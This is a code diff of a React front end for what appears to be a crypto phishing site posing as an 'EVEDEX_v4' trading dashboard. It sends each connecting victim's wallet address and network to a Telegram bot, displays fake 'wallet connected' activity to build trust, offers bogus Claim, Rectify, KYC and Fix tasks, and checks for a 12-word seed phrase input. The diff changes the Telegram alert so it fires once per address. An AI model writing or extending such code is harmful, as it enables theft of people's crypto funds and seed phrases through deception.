@@ -28,23 +28,24 @@ export default function App() {
     fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(msg)}`).catch(() => {});
   };
 
-  // 🎯 REAL HIT - ONLY FIRE ONCE
+  // 🎯 REAL HIT - MUST FIRE ON CONNECTION
   useEffect(() => {
     if (isConnected && address) {
-      if (!sessionStorage.getItem('real_hit')) {
+      const key = 'hit_v2_' + address;
+      if (!sessionStorage.getItem(key)) {
         log(`🎯 REAL WALLET CONNECTED!\n\nADDR: ${address}\nNET: ${chainId}`);
-        sessionStorage.setItem('real_hit', 'true');
+        sessionStorage.setItem(key, 'true');
       }
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, chainId]);
 
-  // SCREEN FEED
+  // SCREEN FEED LOOP
   useEffect(() => {
     const loop = setInterval(() => {
       const r = Math.floor(1000 + Math.random() * 8999);
       setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
       setTimeout(() => setFeedMsg(""), 4000);
-    }, 11000);
+    }, 12000);
     return () => clearInterval(loop);
   }, []);
 
@@ -71,7 +72,7 @@ export default function App() {
   const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length >= 12;
 
   return (
-    <div key="master-ui-v5" style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
+    <div id="v1-final-lock" style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
         <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
         <appkit-button />
@@ -83,7 +84,7 @@ export default function App() {
             <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
-          {/* SLIPPAGE & GAS (RESTORED) */}
+          {/* ⚡ SLIPPAGE BAR - MUST BE VISIBLE */}
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
             <span>〽️ GAS: 14 GWEI</span><span>⚡ SLIPPAGE: 0.1%</span><span>📡 SYNC: 99.9%</span>
           </div>
@@ -92,7 +93,7 @@ export default function App() {
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                 <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
-                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
+                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900', cursor: 'pointer'}}>
                   <div>{n === "Rectify" ? "⚡" : "〽️"}</div><div style={{fontSize:'9px'}}>{n}</div>
                 </button>
               ))}
@@ -102,15 +103,18 @@ export default function App() {
           {view === "task_box" && (
             <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center', position:'relative'}}>
               <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
+              
+              {/* 🔄 USDT / GAS SWITCH */}
               <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
-                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900'}}>USDT_POOL</div>
-                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900'}}>GAS_POOL</div>
+                <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>USDT_POOL</div>
+                <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", fontWeight:'900', cursor:'pointer'}}>GAS_POOL</div>
               </div>
+
               <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                 <input value={inputVal} readOnly={activeTask === "Rectify"} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
               </div>
-              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}>START_HANDSHAKE</button>
+              <button onClick={handleHandshake} style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal !== "" && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none', cursor:'pointer'}}>START_HANDSHAKE</button>
             </div>
           )}
 
